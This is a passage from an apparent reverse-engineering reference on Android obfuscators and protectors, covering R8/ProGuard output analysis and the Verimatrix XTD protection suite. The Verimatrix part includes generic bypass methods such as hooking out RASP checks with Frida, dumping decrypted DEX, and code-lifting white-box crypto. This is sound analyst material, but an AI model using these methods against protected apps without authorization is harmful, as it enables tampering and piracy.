(Issue #267)</li> <li>APKiD Promon SHIELD at 34C3 (Issue #72)</li> <li>Honey, I Shrunk Your App Security (DIMVA 2018)</li> <li>APKiD -- Android Application Identifier</li> </ul>"},{"location":"packers/r8-proguard/","title":"R8 / ProGuard","text":"<p>R8 and ProGuard are code transformation tools that ship with the Android build toolchain. They are technically obfuscators, not packers -- they do not encrypt DEX files, wrap native loaders, or perform any runtime self-protection. However, they are the most commonly encountered code transformation in Android reverse engineering, and understanding their output is a prerequisite for analyzing virtually any production Android application.</p>"},{"location":"packers/r8-proguard/#overview","title":"Overview","text":"Attribute ProGuard R8 Developer Guardsquare (Eric Lafortune) Google Type Open-source obfuscator/optimizer Built into Android Gradle Plugin Status Legacy (still functional) Default since AGP 3.4.0 (2019) Rule format <code>-keep</code> rules in <code>proguard-rules.pro</code> Same rule format as ProGuard Implementation Separate JAR, processes .class files Integrated into D8 dexer, processes directly to DEX <p>R8 replaced ProGuard as the default code shrinker and obfuscator in the Android Gradle Plugin. Both use the same configuration file format (<code>proguard-rules.pro</code>), so from a rule-writing perspective they are interchangeable. The key difference is implementation: R8 operates directly on DEX bytecode as part of the D8 compilation pipeline, while ProGuard operated on Java bytecode before dexing.</p> <p>For reverse engineers, this distinction rarely matters. The output of both tools produces the same general patterns in decompiled code. R8 tends to be more aggressive with certain optimizations (inlining, class merging), which can make decompiled output slightly different.</p>"},{"location":"packers/r8-proguard/#what-they-do","title":"What They Do","text":""},{"location":"packers/r8-proguard/#name-obfuscation","title":"Name Obfuscation","text":"<p>The most visible transformation. Classes, methods, and fields are renamed to short, meaningless identifiers:</p> <pre><code>com.example.myapp.network.ApiClient  -&gt;  a.b.c\ncom.example.myapp.network.ApiClient.fetchUserProfile()  -&gt;  a.b.c.a()\ncom.example.myapp.model.UserProfile  -&gt;  a.b.d\ncom.example.myapp.model.UserProfile.displayName  -&gt;  a.b.d.a\ncom.example.myapp.model.UserProfile.emailAddress  -&gt;  a.b.d.b\n</code></pre> <p>Names are assigned alphabetically within each scope. The first class in a package becomes <code>a</code>, the second <code>b</code>, and so on. After <code>z</code>, naming continues with <code>aa</code>, <code>ab</code>, etc. This scheme is deterministic per build but changes between releases as code is added or removed.</p>"},{"location":"packers/r8-proguard/#code-shrinking-tree-shaking","title":"Code Shrinking (Tree Shaking)","text":"<p>Removes unreachable code. Starting from entry points (activities, services, content providers, broadcast receivers declared in the manifest), R8/ProGuard traces all reachable code paths and discards everything else. This eliminates:</p> <ul> <li>Unused classes and interfaces</li> <li>Unused methods and fields</li> <li>Unused code branches within methods</li> <li>Unused library code pulled in as dependencies</li> </ul> <p>For analysts, this means the APK only contains code that is actually reachable. Dead library code and unused features are stripped, reducing noise in the decompiled output.</p>"},{"location":"packers/r8-proguard/#optimization","title":"Optimization","text":"<p>R8 performs several bytecode-level optimizations:</p> Optimization Effect on Decompiled Code Method inlining Small methods disappear; their code appears at call sites Devirtualization Virtual calls replaced with direct calls when only one implementation exists Constant propagation Computed constants replaced with literal values Dead branch removal Unreachable if/else branches eliminated Enum unboxing Enum classes replaced with int constants (R8 only, with full mode) Class merging Separate classes merged into one when possible (R8 only) Outlining Repeated code sequences extracted into shared methods (R8 only)"},{"location":"packers/r8-proguard/#what-they-do-not-do","title":"What They Do NOT Do","text":"<p>R8 and ProGuard provide zero runtime protection:</p> <ul> <li>No string encryption -- all string literals remain as plaintext in the DEX</li> <li>No class/DEX encryption -- the DEX file is fully readable</li> <li>No anti-debugging -- no detection of debuggers, Frida, or Xposed</li> <li>No anti-tampering -- no signature verification or integrity checks</li> <li>No root/emulator detection -- no environmental checks</li> <li>No native code protection -- JNI libraries are untouched</li> <li>No control flow obfuscation -- code logic remains structurally intact</li> </ul> <p>This is the fundamental distinction between R8/ProGuard and tools like DexGuard, Virbox, or Chinese packers. If an APK only uses R8/ProGuard, all strings, API calls, URLs, and logic are visible in static analysis. The only challenge is navigating renamed identifiers.</p>"},{"location":"packers/r8-proguard/#reverse-engineering-r8proguard-output","title":"Reverse Engineering R8/ProGuard Output","text":""},{"location":"packers/r8-proguard/#reading-obfuscated-code","title":"Reading Obfuscated Code","text":"<p>Typical R8/ProGuard output in jadx:</p> <pre><code>package a.b;\n\npublic class c {\n    private final d a;\n    private String b;\n\n    public c(d dVar) {\n        this.a = dVar;\n    }\n\n    public void a(String str) {\n        this.b = str;\n        this.a.a(\"https://api.example.com/user\", str, new a.b.e() {\n            @Override\n            public void a(String str2) {\n                f.a(str2);\n            }\n\n            @Override\n            public void b(Exception exc) {\n                Log.e(\"NetClient\", exc.getMessage());\n            }\n        });\n    }\n}\n</code></pre> <p>The class and method names are meaningless, but the string literals (<code>\"https://api.example.com/user\"</code>, <code>\"NetClient\"</code>) and Android framework calls (<code>Log.e</code>) are fully visible. This is the key advantage for analysts: R8/ProGuard cannot hide what the code actually does.</p>"},{"location":"packers/r8-proguard/#using-mappingtxt","title":"Using mapping.txt","text":"<p>When a build produces an R8/ProGuard-obfuscated APK, it also generates a <code>mapping.txt</code> file that maps obfuscated names back to original names. This file is used for crash report deobfuscation (uploaded to Google Play Console or Crashlytics).</p> <p>Format:</p> <pre><code>com.example.myapp.network.ApiClient -&gt; a.b.c:\n    okhttp3.OkHttpClient httpClient -&gt; a\n    java.lang.String baseUrl -&gt; b\n    void fetchUserProfile(java.lang.String) -&gt; a\n    void handleResponse(okhttp3.Response) -&gt; b\ncom.example.myapp.model.UserProfile -&gt; a.b.d:\n    java.lang.String displayName -&gt; a\n    java.lang.String emailAddress -&gt; b\n</code></pre> <p>Analysts occasionally obtain <code>mapping.txt</code> through:</p> <ul> <li>Leaked build artifacts (CI/CD misconfigurations, exposed storage buckets)</li> <li>Google Play Console access (internal assessments)</li> <li>Bundled accidentally in the APK itself (rare but happens)</li> <li>Firebase Crashlytics storage (if accessible)</li> </ul> <p>jadx can apply mapping files directly via <code>File &gt; Load mappings</code>.</p>"},{"location":"packers/r8-proguard/#jadx-deobfuscation-features","title":"jadx Deobfuscation Features","text":"<p>jadx provides built-in deobfuscation that renames classes and methods based on usage patterns, even without <code>mapping.txt</code>:</p> <ul> <li>Auto-rename (<code>--deobf</code> flag or <code>Preferences &gt; Deobfuscation</code>): assigns readable names based on heuristics</li> <li>Type-based renaming: when a field is assigned from <code>getSharedPreferences()</code>, jadx can infer the field likely holds preferences</li> <li>Interface method propagation: if an obfuscated class implements <code>View.OnClickListener</code>, jadx knows the <code>a()</code> method is actually <code>onClick()</code></li> </ul>"},{"location":"packers/r8-proguard/#recovering-original-names","title":"Recovering Original Names","text":"<p>Even without mapping files, many original names survive obfuscation or can be inferred:</p> <p>String References</p> <p>Log tags, exception messages, and debug strings often reveal the original purpose:</p> <pre><code>public class a {\n    public void b() {\n        Log.d(\"PaymentProcessor\", \"Processing transaction\");\n        ...\n    }\n}\n</code></pre> <p>The log tag <code>\"PaymentProcessor\"</code> reveals the class purpose despite its <code>a</code> name.</p> <p>Android Framework and Library Calls</p> <p>Method signatures of Android APIs and common libraries are never obfuscated:</p> <pre><code>public class a extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        String action = intent.getAction();\n        if (\"android.provider.Telephony.SMS_RECEIVED\".equals(action)) {\n            ...\n        }\n    }\n}\n</code></pre> <p>The superclass, overridden method name, and intent action string immediately identify this as an SMS interceptor.</p> <p>Reflection Usage</p> <p>Code that uses reflection must reference original class and method names as strings:</p> <pre><code>Class cls = Class.forName(\"android.telephony.TelephonyManager\");\nMethod m = cls.getMethod(\"getDeviceId\");\n</code></pre> <p>These strings survive obfuscation because they are runtime values, not compile-time identifiers.</p> <p>Serialized Field Names</p> <p>JSON serialization libraries preserve field names as strings:</p> <pre><code>public class d {\n    @SerializedName(\"account_number\")\n    public String a;\n\n    @SerializedName(\"routing_number\")\n    public String b;\n\n    @SerializedName(\"balance\")\n    public double c;\n}\n</code></pre> <p>The <code>@SerializedName</code> annotations (or equivalent JSON keys) reveal the real purpose of each field.</p> <p>AIDL Interfaces</p> <p>AIDL-generated code retains transaction names and descriptor strings:</p> <pre><code>public static final String DESCRIPTOR = \"com.example.myapp.IRemoteService\";\n</code></pre> <p>Manifest-Declared Components</p> <p>Activities, services, receivers, and providers declared in <code>AndroidManifest.xml</code> keep their full class names because the Android runtime needs to find and instantiate them.</p>"},{"location":"packers/r8-proguard/#keep-rules-as-intelligence","title":"Keep Rules as Intelligence","text":"<p>The <code>proguard-rules.pro</code> file (or <code>consumer-rules.pro</code> for libraries) defines which classes, methods, and fields must not be renamed or removed. These rules are a goldmine for analysts because they reveal architectural decisions and dependencies.</p>"},{"location":"packers/r8-proguard/#reading-keep-rules","title":"Reading Keep Rules","text":"<pre><code>-keep class com.example.myapp.api.** { *; }\n-keep class com.example.myapp.model.** { *; }\n-keepclassmembers class * implements android.os.Parcelable {\n    static ** CREATOR;\n}\n-keepnames class * extends com.example.myapp.plugin.PluginBase\n</code></pre> <p>These rules tell an analyst:</p> <ul> <li>The <code>api</code> and <code>model</code> packages contain classes used via reflection or serialization (likely API request/response models)</li> <li>The app uses <code>Parcelable</code> for IPC</li> <li>There is a plugin system with a <code>PluginBase</code> class and dynamically loaded implementations</li> </ul>"},{"location":"packers/r8-proguard/#what-keep-rules-reveal","title":"What Keep Rules Reveal","text":"Rule Pattern Implies <code>-keep class **.model.** { *; }</code> JSON/XML serialization models -- field names map to API schema <code>-keep class ** extends android.app.Service</code> Services loaded by name (possibly from config) <code>-keepclassmembers class * { @com.google.gson.annotations.* &lt;fields&gt;; }</code> Uses Gson for JSON parsing <code>-keep class **.BuildConfig { *; }</code> Build configuration exposed at runtime <code>-keep class * implements java.io.Serializable</code> IPC or persistence via Java serialization <code>-keep class **.js.** { *; }</code> JavaScript bridge interfaces for WebView <code>-keepclassmembers class * { @android.webkit.JavascriptInterface &lt;methods&gt;; }</code> WebView JS bridge -- potential attack surface"},{"location":"packers/r8-proguard/#finding-keep-rules-in-apks","title":"Finding Keep Rules in APKs","text":"<p>R8 embeds a processed version of the keep rules into the build. Some APKs include the original <code>proguard-rules.pro</code> in the root of the APK or inside <code>META-INF/</code>. Additionally, library AARs bundle their own <code>proguard.txt</code> consumer rules that get merged into the final configuration.</p>"},{"location":"packers/r8-proguard/#common-patterns","title":"Common Patterns","text":""},{"location":"packers/r8-proguard/#enum-names-survive","title":"Enum Names Survive","text":"<p>Enum constants are almost always preserved because <code>Enum.valueOf(String)</code> requires the original name at runtime:</p> <pre><code>public enum a {\n    TRANSACTION_SUCCESS,\n    TRANSACTION_FAILED,\n    TRANSACTION_PENDING,\n    INSUFFICIENT_FUNDS;\n}\n</code></pre> <p>The class name <code>a</code> is obfuscated, but the constant names reveal intent. This is one of the most reliable sources of plaintext names in obfuscated APKs.</p>"},{"location":"packers/r8-proguard/#parcelable-classes","title":"Parcelable Classes","text":"<p>Classes implementing <code>Parcelable</code> require a public <code>CREATOR</code> field and are often referenced by name in intents. The default ProGuard rules keep the <code>CREATOR</code> field, and the class itself is typically kept because it crosses process boundaries.</p>"},{"location":"packers/r8-proguard/#manifest-declared-components","title":"Manifest-Declared Components","text":"<p>All components declared in <code>AndroidManifest.xml</code> retain their original fully qualified class names:</p> <pre><code>&lt;activity android:name=\"com.example.myapp.ui.LoginActivity\" /&gt;\n&lt;service android:name=\"com.example.myapp.service.DataExfiltrationService\" /&gt;\n&lt;receiver android:name=\"com.example.myapp.receiver.BootReceiver\" /&gt;\n</code></pre> <p>These names survive R8/ProGuard because the Android framework instantiates them by name. The manifest is the first place to look for meaningful class names in an obfuscated APK.</p>"},{"location":"packers/r8-proguard/#serialization-models","title":"Serialization Models","text":"<p>GSON, Moshi, Jackson, and similar libraries require field names to match JSON keys. These classes are either kept entirely or annotated with <code>@SerializedName</code> / <code>@Json</code>:</p> <pre><code>public class c {\n    @SerializedName(\"device_id\")\n    String a;\n\n    @SerializedName(\"installed_apps\")\n    List&lt;String&gt; b;\n\n    @SerializedName(\"sms_messages\")\n    List&lt;d&gt; c;\n}\n</code></pre> <p>The annotations expose the data model regardless of field renaming.</p>"},{"location":"packers/r8-proguard/#native-method-declarations","title":"Native Method Declarations","text":"<p>JNI method names must match between Java and native code. If using static registration (not <code>RegisterNatives</code>), the native method names survive obfuscation:</p> <pre><code>public class a {\n    public static native String decryptPayload(byte[] data, int key);\n}\n</code></pre> <p>However, if the class containing the native method is renamed, the corresponding JNI function name in the .so must also match the obfuscated name (e.g., <code>Java_a_b_c_decryptPayload</code>). Developers often keep native classes unobfuscated to avoid this complexity.</p>"},{"location":"packers/r8-proguard/#r8-vs-proguard-differences","title":"R8 vs ProGuard Differences","text":""},{"location":"packers/r8-proguard/#class-merging-r8-only","title":"Class Merging (R8 Only)","text":"<p>R8 can merge classes that have a single implementation or are only used in one place. A class and its only subclass may be collapsed into one:</p> <pre><code>Before R8:\n  abstract class BaseRepository { void save(Data d); }\n  class UserRepository extends BaseRepository { void save(Data d) { ... } }\n\nAfter R8:\n  class a { void a(b bVar) { ... } }\n</code></pre> <p>The inheritance relationship disappears entirely. This makes reconstructing the original architecture harder.</p>"},{"location":"packers/r8-proguard/#more-aggressive-inlining","title":"More Aggressive Inlining","text":"<p>R8 inlines more aggressively than ProGuard. Short methods (getters, setters, simple wrappers) are absorbed into their callers. The decompiled output may show inline code where the original had clean method boundaries:</p> <pre><code>this.a.b = this.c.a().getSharedPreferences(\"prefs\", 0).getString(\"token\", \"\");\n</code></pre> <p>This single line might represent three separate method calls in the original source.</p>"},{"location":"packers/r8-proguard/#enum-unboxing-r8-full-mode","title":"Enum Unboxing (R8 Full Mode)","text":"<p>With R8 full mode (<code>android.enableR8.fullMode=true</code>), enums can be replaced with integer constants. The enum class disappears and all <code>switch</code> statements use raw ints. This removes the enum name survival pattern described above.</p>"},{"location":"packers/r8-proguard/#kotlin-metadata-stripping","title":"Kotlin Metadata Stripping","text":"<p>R8 strips Kotlin metadata annotations by default. ProGuard preserved them unless explicitly told to remove them. The presence or absence of <code>kotlin.Metadata</code> annotations on classes can hint at which tool was used.</p>"},{"location":"packers/r8-proguard/#identifying-which-tool-was-used","title":"Identifying Which Tool Was Used","text":"Indicator ProGuard R8 Class merging observed No Possible Kotlin metadata present Often preserved Stripped <code>$$Lambda$</code> synthetic classes Present Desugared differently Enum constants as ints No Possible (full mode) Build metadata comment in mapping.txt <code># ProGuard, version X.Y.Z</code> <code># compiler: R8</code> <p>In practice, distinguishing the tool rarely matters for analysis. The deobfuscation approach is the same regardless.</p>"},{"location":"packers/r8-proguard/#malware-context","title":"Malware Context","text":""},{"location":"packers/r8-proguard/#proguardr8-only-malware","title":"ProGuard/R8-Only Malware","text":"<p>Many Android malware families ship with only R8 or ProGuard obfuscation and no additional packing. This is the lowest tier of protection:</p> <ul> <li>All strings (C2 URLs, API keys, target app lists) are plaintext in the DEX</li> <li>All API calls are visible to static analysis tools</li> <li>Behavioral analysis is possible without any unpacking or decryption</li> <li>Automated scanners (VirusTotal, Google Play Protect) can pattern-match directly</li> </ul> <p>Families that historically relied on R8/ProGuard alone include early variants of SpyNote, Cerberus-lineage builders, and many low-sophistication SMS stealers and banking trojans.</p>"},{"location":"packers/r8-proguard/#distinguishing-from-dexguard","title":"Distinguishing from DexGuard","text":"<p>DexGuard is built by Guardsquare, the same company that maintains ProGuard. DexGuard extends R8/ProGuard with encryption and runtime protection. Key differences in decompiled output:</p> Feature R8/ProGuard DexGuard String literals Plaintext Encrypted (method calls returning strings) String access <code>\"https://c2.example.com\"</code> <code>o.oo(\"\\\\x4a\\\\x2f...\")</code> Class loading Standard Custom class loader for encrypted classes Native libraries None added <code>libdexguard.so</code> or obfuscated stubs Asset files Normal Encrypted DEX payloads in <code>assets/</code> APKiD detection No special flags <code>packer: DexGuard</code>, <code>anti_disassembly: DexGuard</code> Environmental checks None Root, emulator, debugger, Frida, Xposed detection <p>The fastest way to distinguish: open the APK in jadx and search for string literals. If C2 URLs, package names, and configuration data appear as readable strings, it is R8/ProGuard. If strings are replaced by method calls to single-letter classes that take byte arrays, it is likely DexGuard or another string-encrypting protector.</p>"},{"location":"packers/r8-proguard/#layered-protection","title":"Layered Protection","text":"<p>More sophisticated malware operations use R8/ProGuard as a base layer and add protection on top:</p> <pre><code>R8/ProGuard (name obfuscation, shrinking)\n  + Custom string encryption (XOR/AES of sensitive strings)\n  + Dynamic class loading (second-stage DEX from assets or network)\n  + Native code for critical logic (C2 communication, credential theft)\n</code></pre> <p>This layered approach is cheaper than licensing DexGuard and gives operators more control. Analysts should not assume that R8/ProGuard-level obfuscation is the only protection present -- always check for custom encryption methods and dynamic loading patterns.</p>"},{"location":"packers/r8-proguard/#analyst-workflow","title":"Analyst Workflow","text":"<pre><code>1. Open APK in jadx\n2. Check AndroidManifest.xml for component names (Activities, Services, Receivers)\n3. Search strings for URLs, IPs, package names, API endpoints\n4. If all strings are plaintext -&gt; R8/ProGuard only, proceed with static analysis\n5. If strings are encrypted -&gt; additional protection present (DexGuard, custom)\n6. Use jadx deobfuscation (--deobf) to auto-rename classes\n7. Start from manifest-declared components and trace call graphs\n8. Use enum names, log tags, and serialization annotations to reconstruct meaning\n9. Cross-reference with mapping.txt if available\n</code></pre>"},{"location":"packers/r8-proguard/#references","title":"References","text":"<ul> <li>R8 Documentation</li> <li>ProGuard Manual</li> <li>R8 Compatibility FAQ</li> <li>APKiD</li> </ul>"},{"location":"packers/verimatrix/","title":"Verimatrix XTD","text":"<p>Verimatrix XTD (Extended Threat Defense) is a commercial application protection platform originally developed by Inside Secure (France). The XTD product line was acquired by Guardsquare (Belgium) in February 2026 for $8.5M, placing it under the same corporate umbrella as DexGuard and ProGuard.</p>"},{"location":"packers/verimatrix/#vendor-information","title":"Vendor Information","text":"Attribute Details Developer Verimatrix (originally Inside Secure, now Guardsquare) Origin France (Aix-en-Provence) Type Commercial Protector/Obfuscator/RASP Platforms Android, iOS, Web (JavaScript frameworks) Acquisition Inside Secure acquired Verimatrix in 2019 for $143M, took Verimatrix name. XTD product line sold to Guardsquare in Feb 2026 for $8.5M Current Owner Guardsquare (Belgium)"},{"location":"packers/verimatrix/#history-and-ownership","title":"History and Ownership","text":"<p>The lineage of this product is convoluted:</p> <ol> <li>Inside Secure (France) developed the original application protection technology, including Whitebox 3.0 cryptography</li> <li>2019: Inside Secure acquired Verimatrix Inc for $143M and rebranded the combined entity as Verimatrix</li> <li>Dec 2025 -- Feb 2026: Verimatrix sold its XTD (app shielding), Code Protection, and Whitebox product lines to Guardsquare for $8.5M</li> <li>Feb 2026: Guardsquare now owns DexGuard, ProGuard, and the former Verimatrix XTD suite</li> </ol> <p>This consolidation means Guardsquare controls three distinct application protection products (DexGuard, XTD, ProGuard) and one white-box cryptography solution. Future product consolidation is likely -- redundant features between DexGuard and XTD will probably be merged, and the Verimatrix white-box crypto technology may be integrated into DexGuard's offering.</p>"},{"location":"packers/verimatrix/#identification","title":"Identification","text":""},{"location":"packers/verimatrix/#apkid-detection","title":"APKiD Detection","text":"<p>APKiD detects Verimatrix under its original Inside Secure branding:</p> <pre><code>protector : InsideSecure\n</code></pre> <p>APKiD issue #397 documents a false positive where zShield-protected applications were incorrectly flagged as InsideSecure. Verify detection by checking for the additional file artifacts below.</p>"},{"location":"packers/verimatrix/#file-artifacts","title":"File Artifacts","text":"Artifact Description Native library <code>libencryption_&lt;arch&gt;.so</code> (architecture-specific naming) ProGuard/R8 rules <code>-keep</code> rules referencing <code>com.insidesecure.core</code> package Gradle plugin <code>ApkdefenderPlugin.jar</code> in build configuration SDK AAR <code>vmx-xtd-sdk.aar</code> in project dependencies"},{"location":"packers/verimatrix/#proguard-keep-rules","title":"ProGuard Keep Rules","text":"<p>Protected applications include keep rules for Verimatrix's runtime classes:</p> <pre><code>-keep class com.insidesecure.core.** { *; }\n-keep class com.verimatrix.shield.** { *; }\n</code></pre> <p>The <code>com.insidesecure.core</code> package reference persists even after the Verimatrix rebranding, serving as a reliable identification marker.</p>"},{"location":"packers/verimatrix/#build-integration","title":"Build Integration","text":""},{"location":"packers/verimatrix/#gradle-plugin","title":"Gradle Plugin","text":"<p>Verimatrix XTD integrates as a Gradle plugin through <code>ApkdefenderPlugin.jar</code>. The plugin adds protection tasks to the build pipeline:</p> <pre><code>apkprotectDebugRelease\napkprotectVariantRelease\n</code></pre> <p>These tasks run after APK/AAB assembly and apply the configured protection layers to the compiled binary.</p>"},{"location":"packers/verimatrix/#sdk-integration","title":"SDK Integration","text":"<p>The runtime SDK is distributed as <code>vmx-xtd-sdk.aar</code>, which applications include as a dependency. This AAR contains the runtime components needed for RASP checks, white-box crypto operations, and environmental detection.</p>"},{"location":"packers/verimatrix/#cloud-portal","title":"Cloud Portal","text":"<p>Verimatrix operated a cloud portal at <code>appshield.verimatrixcloud.net</code> for configuring protection policies and managing application builds. Following the Guardsquare acquisition, this infrastructure's future is uncertain.</p>"},{"location":"packers/verimatrix/#cicd-integration","title":"CI/CD Integration","text":"<p>GitHub Actions integration is available through the <code>Verimatrix/app-shield-protect</code> action, enabling automated protection in CI/CD pipelines.</p>"},{"location":"packers/verimatrix/#protection-mechanisms","title":"Protection Mechanisms","text":""},{"location":"packers/verimatrix/#multi-language-code-obfuscation","title":"Multi-Language Code Obfuscation","text":"<p>Verimatrix XTD applies obfuscation across multiple programming languages within a single application:</p> Language Obfuscation Support Java Full (bytecode transformation) Kotlin Full (bytecode transformation) C/C++ Native code obfuscation Swift iOS native obfuscation JavaScript Web/hybrid framework obfuscation"},{"location":"packers/verimatrix/#control-flow-obfuscation","title":"Control Flow Obfuscation","text":"<p>Transforms original control flow structures into flattened or opaque predicate-based patterns. Conditional branches are replaced with computed jumps, and loop structures are converted to state machines.</p>"},{"location":"packers/verimatrix/#symbol-renaming","title":"Symbol Renaming","text":"<p>Class, method, and field names are replaced with meaningless identifiers. Unlike ProGuard/R8's simple sequential renaming (a, b, c), Verimatrix can apply more aggressive renaming patterns.</p>"},{"location":"packers/verimatrix/#string-obfuscation","title":"String Obfuscation","text":"<p>String literals are replaced with runtime-computed values. Decryption routines are inlined at each use site rather than centralized, making batch decryption hooking harder than with DexGuard's pattern of centralized decryption classes.</p>"},{"location":"packers/verimatrix/#arithmetic-obfuscation","title":"Arithmetic Obfuscation","text":"<p>Constant values and arithmetic operations are transformed into equivalent but more complex expressions. A simple integer comparison becomes a chain of bitwise operations and arithmetic that produces the same result.</p>"},{"location":"packers/verimatrix/#code-encryption","title":"Code Encryption","text":"<p>Selected code sections are encrypted at rest and decrypted at runtime. This applies to both DEX bytecode and native code sections.</p>"},{"location":"packers/verimatrix/#runtime-environmental-checks","title":"Runtime Environmental Checks","text":"Check Description Root detection Detects su, Magisk, SuperSU, system partition modification Emulator detection Build properties, hardware fingerprinting Debug detection ptrace, TracerPid, JDWP Hook detection Frida, Xposed, Substrate Clone detection Multi-instance and app cloning"},{"location":"packers/verimatrix/#binary-integrity-checks-superchecks","title":"Binary Integrity Checks (\"Superchecks\")","text":"<p>Verimatrix implements what it calls \"superchecks\" -- integrity verification routines that validate the binary's structure at runtime. These checks go beyond simple hash verification, examining code section integrity, resource consistency, and native library state.</p>"},{"location":"packers/verimatrix/#anti-tamper","title":"Anti-Tamper","text":"<p>Detects modification of the APK structure, DEX bytecode, native libraries, and resources. Tampering triggers configurable responses.</p>"},{"location":"packers/verimatrix/#anti-debug","title":"Anti-Debug","text":"<p>Multi-layer debugger detection covering both Java-level (JDWP) and native-level (ptrace, TracerPid) debuggers.</p>"},{"location":"packers/verimatrix/#anti-hook","title":"Anti-Hook","text":"<p>Detects function hooking frameworks including Frida, Xposed, and Cydia Substrate through process memory inspection, loaded library scanning, and runtime class enumeration.</p>"},{"location":"packers/verimatrix/#anti-clone","title":"Anti-Clone","text":"<p>Prevents application cloning and multi-instance execution by validating the installation context and package identity.</p>"},{"location":"packers/verimatrix/#zero-day-flagsblockers","title":"Zero-Day Flags/Blockers","text":"<p>Verimatrix supports OTA-updatable detection rules. New threat signatures (root hiding tools, new Frida variants, novel hooking techniques) can be pushed to deployed applications without requiring a full app update. This is a significant defensive capability -- the protection adapts after deployment.</p>"},{"location":"packers/verimatrix/#accessibility-abuse-detection","title":"Accessibility Abuse Detection","text":"<p>Detects when other applications are using Android's Accessibility Service to interact with the protected application. This counters overlay attacks and automated UI interaction from malware.</p>"},{"location":"packers/verimatrix/#rasp","title":"RASP","text":"<p>Full Runtime Application Self-Protection suite combining the environmental checks, integrity verification, and threat response into a cohesive runtime defense layer.</p>"},{"location":"packers/verimatrix/#white-box-cryptography","title":"White-Box Cryptography","text":"<p>Verimatrix's white-box cryptography is the most technically significant component of the product suite. Originally developed as Inside Secure Whitebox 3.0, it is EMVCo certified for payment security.</p>"},{"location":"packers/verimatrix/#design","title":"Design","text":"<p>White-box crypto transforms standard cryptographic algorithms so that keys are dissolved into the code itself. The key material does not exist as a discrete byte sequence at any point during execution -- it is mathematically distributed across lookup tables and code transformations. The implementation is algorithm-agnostic: the same white-box framework wraps multiple algorithms.</p>"},{"location":"packers/verimatrix/#supported-algorithms","title":"Supported Algorithms","text":"Algorithm Support AES Encryption/decryption AES-GCM Authenticated encryption 3DES Legacy block cipher RSA Asymmetric operations ECDSA Signature verification ECC Elliptic curve operations ECDH Key exchange HMAC Message authentication SHA family Hashing"},{"location":"packers/verimatrix/#security-properties","title":"Security Properties","text":"<ul> <li>Keys resist extraction through static reverse engineering</li> <li>Side-channel analysis (power analysis, electromagnetic emanation) is mitigated through algorithmic design</li> <li>Fault injection attacks (glitching) are detected and countered</li> <li>EMVCo certification validates resistance against a defined set of attack methodologies</li> </ul>"},{"location":"packers/verimatrix/#reverse-engineering-implications","title":"Reverse Engineering Implications","text":"<p>White-box crypto is the hardest component of Verimatrix to defeat. Unlike code obfuscation (which can be bypassed through dynamic analysis) or RASP checks (which can be hooked and disabled), white-box crypto is mathematically designed to resist key extraction. An attacker with full binary access and debugger control still cannot extract the key in a usable form.</p> <p>Practical approaches against white-box crypto:</p> <ul> <li>Differential fault analysis (DFA): Inject faults into the computation and analyze output differences to recover key bits. Requires significant expertise and per-implementation effort</li> <li>Code lifting: Extract the entire white-box implementation and use it as a black box without extracting the key. The implementation becomes an oracle that encrypts/decrypts on demand</li> <li>API hooking: Intercept inputs and outputs of the white-box function calls to capture plaintext data without breaking the crypto</li> </ul>"},{"location":"packers/verimatrix/#framework-support","title":"Framework Support","text":"<p>Verimatrix XTD supports protection of applications built with multiple frameworks:</p> Framework Protection Level Angular JavaScript obfuscation React JavaScript obfuscation React Native JavaScript + native bridge protection Vue JavaScript obfuscation Webpack Bundle-level obfuscation Xamarin .NET/Mono + native protection <p>This multi-framework support is particularly relevant for hybrid applications where JavaScript business logic needs protection alongside native components.</p>"},{"location":"packers/verimatrix/#bypass-approaches","title":"Bypass Approaches","text":"<p>Public bypass research for Verimatrix XTD is limited. The product has received less attention from the security research community compared to DexGuard or Chinese packers.</p>"},{"location":"packers/verimatrix/#general-approach","title":"General Approach","text":"<ol> <li>Identify the protection layers present (APKiD, manual artifact inspection)</li> <li>Bypass RASP checks using standard anti-detection Frida scripts</li> <li>Dump decrypted DEX at runtime if code encryption is applied</li> <li>For string obfuscation, hook at the use site rather than seeking centralized decryption methods</li> <li>White-box crypto operations should be treated as black boxes -- intercept I/O rather than attempting key extraction</li> </ol>"},{"location":"packers/verimatrix/#white-box-crypto","title":"White-Box Crypto","text":"<p>The white-box implementation is the primary barrier to complete analysis. Code lifting (extracting the white-box tables and reimplementing the encryption/decryption outside the app) is more practical than attempting key extraction. This approach works for cases where the goal is to replicate the app's cryptographic behavior rather than recover the raw key.</p>"},{"location":"packers/verimatrix/#malware-usage","title":"Malware Usage","text":"<p>Verimatrix XTD has not been observed in malware samples. The commercial licensing model, cloud-based build integration, and enterprise sales process make it impractical for malware authors. The product is exclusively found in legitimate applications.</p>"},{"location":"packers/verimatrix/#industry-usage","title":"Industry Usage","text":"<p>Verimatrix XTD is deployed across several verticals:</p> Industry Use Case Media/streaming DRM protection, content security Gaming Anti-cheat, asset protection Fintech Payment security, white-box crypto for key protection Healthcare Patient data protection, HIPAA compliance Automotive Connected car application security <p>The media and streaming sector represents Verimatrix's historical core market, predating the Inside Secure acquisition.</p>"},{"location":"packers/verimatrix/#guardsquare-acquisition-implications","title":"Guardsquare Acquisition Implications","text":"<p>The February 2026 acquisition creates several scenarios for reverse engineers to watch:</p> <ul> <li>Product consolidation: DexGuard and XTD have overlapping features (code obfuscation, RASP, anti-tampering). Guardsquare will likely merge the strongest components of each</li> <li>White-box crypto in DexGuard: Verimatrix's EMVCo-certified white-box crypto could be integrated into DexGuard, making DexGuard significantly harder to defeat for crypto-dependent analysis</li> <li>Detection signature updates: APKiD may need updated signatures as Guardsquare migrates XTD-protected apps to a unified product. The <code>protector : InsideSecure</code> signature may eventually disappear from new builds</li> <li>Existing deployments: Applications already protected with Verimatrix XTD will continue to show current artifacts until developers migrate to whatever Guardsquare's consolidated product becomes</li> </ul>"},{"location":"packers/verimatrix/#comparison-with-other-protectors","title":"Comparison with Other Protectors","text":"Feature Verimatrix XTD DexGuard DexProtector zShield White-box crypto EMVCo certified, algorithm-agnostic No No zKeyBox (separate) Multi-language Java, Kotlin, C/C++, JS, Swift Java, Kotlin, native Java, Kotlin, native Java, Kotlin, native Web framework support Angular, React, Vue, Webpack No No No Code encryption Yes Yes (class encryption) Yes Yes (.szip) OTA threat updates Yes (zero-day flags) No No No Accessibility abuse detection Yes No No No Build integration Gradle plugin + cloud portal Gradle plugin CLI post-build Build-time Current owner Guardsquare Guardsquare Licel Zimperium Public bypass research Minimal Extensive Moderate Limited (XXTEA only) Malware adoption None Cracked versions Rare None"},{"location":"packers/verimatrix/#references","title":"References","text":"<ul> <li>Verimatrix XTD App Shield</li> 